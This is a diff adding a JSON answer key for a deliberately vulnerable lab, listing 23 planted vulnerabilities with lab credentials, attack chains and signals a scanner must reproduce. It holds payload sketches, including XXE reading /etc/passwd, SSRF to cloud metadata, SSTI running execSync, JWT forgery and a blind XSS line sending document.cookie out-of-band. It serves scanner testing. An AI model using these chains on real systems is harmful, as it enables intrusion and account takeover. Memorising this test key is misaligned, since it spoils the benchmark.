@@ -1,0 +1,128 @@
+{
+  "$schema_note": "Ground-truth inventory for the Meridian Ledger lab. Each entry is the canonical description of one planted vulnerability plus a machine-checkable signal a scanner must reproduce to count it as VERIFIED. Consumed by tools/coverage.js. 'auto' = coverage.js can verify it end-to-end against a running lab; 'heuristic'/'manual' need a headless browser or human judgement.",
+  "lab": "meridian-ledger",
+  "version": "1.5.0",
+  "total": 23,
+  "creds": {
+    "attacker": { "email": "alice@meridian.io", "password": "Password123!" },
+    "victim":   { "email": "bob@meridian.io",   "password": "Sunshine#2024" },
+    "admin":    { "email": "admin@meridian.io", "password": "M3ridian!Admin" }
+  },
+  "vulns": [
+    {
+      "id": 1, "name": "IDOR ofuscado (stateful)", "class": "access-control", "severity": "high", "check": "auto",
+      "chain": ["POST /api/reports/open", "PATCH /api/reports/scope {doc_ref: <victim>}", "GET /api/reports/render"],
+      "signal": "render devuelve owner != atacante (memo confidencial de otro tenant)"
+    },
+    {
+      "id": 2, "name": "Race condition (coupon over-redeem)", "class": "concurrency", "severity": "high", "check": "auto",
+      "chain": ["N x POST /api/coupons/redeem {code: WELCOME50}"],
+      "signal": "redenciones exitosas > remaining_uses inicial, o remaining_uses < 0"
+    },
+    {
+      "id": 3, "name": "Blind SSRF (cloud metadata)", "class": "ssrf", "severity": "critical", "check": "auto-oob",
+      "chain": ["POST /api/webhooks/test {url: http://<oob>/}"],
+      "signal": "hit OOB correlacionado con el token"
+    },
+    {
+      "id": 4, "name": "Mass assignment (privilege fields)", "class": "access-control", "severity": "critical", "check": "auto",
+      "chain": ["PUT /api/users/me {role: admin, is_admin: 1, balance: 999999}"],
+      "signal": "GET /api/users/me refleja role=admin / is_admin=true / balance elevado"
+    },
+    {
+      "id": 5, "name": "Prototype pollution -> privesc", "class": "prototype-pollution", "severity": "high", "check": "auto",
+      "chain": ["POST /api/settings {__proto__:{canViewAdmin:true}}", "GET /api/admin/metrics"],
+      "signal": "metrics pasa de 403 a 200 para un usuario no-admin"
+    },
+    {
+      "id": 6, "name": "Deserializacion insegura -> RCE", "class": "rce", "severity": "critical", "check": "auto-oob",
+      "chain": ["GET /api/session/export (formato)", "POST /api/session/restore {state: <base64 node-serialize + IIFE fetch(oob)>}"],
+      "signal": "hit OOB durante el revive (eval)"
+    },
+    {
+      "id": 7, "name": "HTTP Parameter Pollution", "class": "access-control", "severity": "medium", "check": "auto",
+      "chain": ["GET /api/accounts/balance?account_id=<mine>&account_id=<victim>"],
+      "signal": "single=403; duplicado=datos de la cuenta de la victima (first vs last)"
+    },
+    {
+      "id": 8, "name": "Fallo logico financiero", "class": "business-logic", "severity": "high", "check": "heuristic",
+      "chain": ["POST /api/checkout/cart {items:[{qty:-5,price:100}]}", "POST /api/checkout/receipt (saltando /pay)"],
+      "signal": "credits provisionados sin cobro / subtotal manipulado. Heuristica: fuzz numerico + secuencia"
+    },
+    {
+      "id": 9, "name": "SQLi ciega por tiempo (SQLite)", "class": "sqli", "severity": "high", "check": "auto",
+      "chain": ["GET /api/transactions?sort=<recursive CTE timing payload>", "header X-Forwarded-For"],
+      "signal": "delay diferencial estable (baseline ~0s vs inyectado >1.2s), sin SLEEP()"
+    },
+    {
+      "id": 10, "name": "SSRF filter bypass (redirect/encoding)", "class": "ssrf", "severity": "critical", "check": "auto-oob",
+      "chain": ["POST /api/documents/fetch {url: http://<oob-redirector> -> 302 -> 169.254.169.254}"],
+      "signal": "hit OOB; host directo bloqueado pero redirect/encoding pasa"
+    },
+    {
+      "id": 11, "name": "XXE (file read in-band + OOB ciego)", "class": "xxe", "severity": "critical", "check": "auto",
+      "chain": ["POST /api/documents/import-xml (DTD SYSTEM file:///etc/passwd) y (SYSTEM http://<oob>/)"],
+      "signal": "preview incluye contenido de /etc/passwd (in-band); hit OOB (blind)"
+    },
+    {
+      "id": 12, "name": "Prototype pollution -> RCE", "class": "rce", "severity": "critical", "check": "auto-oob",
+      "chain": ["POST /api/settings {__proto__:{converter: <cmd>}}", "POST /api/exports/run"],
+      "signal": "gadget converter ejecutado por execSync (hit OOB / marcador)"
+    },
+    {
+      "id": 13, "name": "SSTI -> RCE", "class": "rce", "severity": "critical", "check": "auto",
+      "chain": ["POST /api/templates/preview {template: ${...execSync('id')}}"],
+      "signal": "salida del comando reflejada en la respuesta del render"
+    },
+    {
+      "id": 14, "name": "JWT alg:none / RS256->HS256 confusion", "class": "auth", "severity": "critical", "check": "auto",
+      "chain": ["GET /api/auth/jwks", "forjar token role=admin (alg:none o HS256 con PEM)", "GET /api/v2/admin"],
+      "signal": "v2/admin devuelve 200 con lista de usuarios usando token forjado"
+    },
+    {
+      "id": 15, "name": "Reset poisoning + token predecible -> ATO", "class": "auth", "severity": "critical", "check": "auto",
+      "chain": ["POST /api/auth/forgot (X-Forwarded-Host) ", "modelar token md5(email:minute:meridian)[:16]", "POST /api/auth/reset"],
+      "signal": "password de la victima cambiado con token derivado (no leido)"
+    },
+    {
+      "id": 16, "name": "CORS refleja Origin + credenciales", "class": "cors", "severity": "medium", "check": "auto",
+      "chain": ["cualquier endpoint con Origin: https://evil.example"],
+      "signal": "ACAO refleja el Origin Y ACAC: true"
+    },
+    {
+      "id": 17, "name": "Session fixation", "class": "session", "severity": "high", "check": "auto",
+      "chain": ["fijar cookie sid conocida", "POST /api/auth/login"],
+      "signal": "el sid NO rota tras autenticar y queda valido como el usuario"
+    },
+    {
+      "id": 18, "name": "SQLi de segundo orden", "class": "sqli", "severity": "high", "check": "auto",
+      "chain": ["PUT /api/users/me {nickname: <payload>}", "GET /api/reports/summary"],
+      "signal": "payload plantado (parametrizado) detona concatenado en summary (timing/error diferencial)"
+    },
+    {
+      "id": 19, "name": "XSS almacenado ciego (dispara en admin)", "class": "xss", "severity": "high", "check": "auto-oob",
+      "chain": ["POST /api/support {body: <img src=x onerror=fetch('/oob/<token>?c='+document.cookie)>}", "admin abre /admin.html"],
+      "signal": "hit OOB con la cookie del admin (requiere render admin / headless o simulacion)"
+    },
+    {
+      "id": 20, "name": "NoSQL-style operator injection", "class": "injection", "severity": "high", "check": "auto",
+      "chain": ["POST /api/search/invoices {filter:{owner_email:{$ne:\"__none__\"}}}"],
+      "signal": "results incluye invoices con owner_email != atacante (scope roto). Variante $or / comilla = SQLi"
+    },
+    {
+      "id": 21, "name": "Web cache poisoning (unkeyed X-Forwarded-Host)", "class": "cache", "severity": "high", "check": "auto",
+      "chain": ["GET /api/status/summary (X-Forwarded-Host: evil.example) para envenenar", "GET /api/status/summary (victima, sin header)"],
+      "signal": "la segunda respuesta (X-Cache: HIT) contiene portal_url/assets_base con host evil.example"
+    },
+    {
+      "id": 22, "name": "JWT kid path traversal + OAuth open redirect", "class": "auth", "severity": "critical", "check": "auto",
+      "chain": ["forjar HS256 con kid traversal (../../../../dev/null -> secreto vacio) role=admin", "GET /api/v2/admin", "GET /api/auth/authorize?redirect_uri=https://evil.example"],
+      "signal": "v2/admin 200 con token de kid forjado; authorize 302 hacia redirect_uri arbitrario con code"
+    },
+    {
+      "id": 23, "name": "Refund double-spend (logica + race fino)", "class": "business-logic", "severity": "critical", "check": "auto",
+      "chain": ["POST /api/billing/charge {amount:1000}", "N x POST /api/billing/refund concurrentes"],
+      "signal": "balance aumenta por N refunds del mismo charge (invariante: 1 refund) y/o refund sin cobro previo"
+    }
+  ]
+}
